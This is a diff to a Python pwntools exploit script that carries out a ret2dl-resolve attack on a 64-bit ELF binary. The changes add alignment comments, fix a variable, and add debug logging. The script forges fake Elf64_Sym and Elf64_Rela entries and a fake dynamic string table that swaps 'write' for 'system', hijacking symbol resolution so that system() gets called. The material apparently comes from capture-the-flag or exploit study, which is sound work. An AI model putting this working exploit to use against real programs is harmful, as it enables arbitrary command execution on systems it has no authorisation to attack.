@@ -23,6 +23,8 @@ def get_shaddr(elfobj, sec_name):
 	return elfobj.get_section_by_name(sec_name)["sh_addr"]
 
 def pwn():
+	# segment writable [0x601000, 0x602000)
+	# .bss [0x601050, 0x601070)
 	bss_addr = g_elf.bss()
 	new_stk = 0
 	data_addr = 0
@@ -40,7 +42,13 @@ def pwn():
 	)
 	
 	fake_dynstr_off = fake_dynstr_addr - dynstr_shaddr
-	fake_refsym_off = fake_refsym - dynsym_shaddr
+
+	# make sure fake_refsym_off % sizeof(Elf64_Sym) == 0,
+	# that is fake_refsym_off % 24 == 0
+	fake_refsym_off = fake_refsym_addr - dynsym_shaddr
+
+	# 64-bit version: make sure fake_reloc_off % sizeof(Elf64_Rela) == 0,
+	# that is fake_reloc_off % 24 == 0
 	fake_reloc_off = fake_reloc_addr - relplt_shaddr
 	
 	# forge fake Elf64_Sym object
@@ -65,6 +73,7 @@ def pwn():
 		st_value,
 		st_size
 	])	
+	log.debug("fake_symobj:\n\tlength=%d\n", len(fake_symobj))
 
 
 	# forge fake Elf64_Rela object
@@ -72,7 +81,9 @@ def pwn():
 	r_offset = 0x601018
 	r_info = (fake_symidx << 32) | 0x7
 	fake_reloc_obj = flat(r_offset, r_info, 0)
+	log.debug("fake_reloc_obj:\n\tlength=%d\n", len(fake_reloc_obj))
 
+	# forge fake dynamic string table
 	fake_dynstr = g_elf.get_section_by_name(".dynstr").data().replace(b"write", b"system")
 	log.debug("fake_dynstr:\n\tlength=%d\n\tcontents=%s\n", len(fake_dynstr), fake_dynstr)
 	
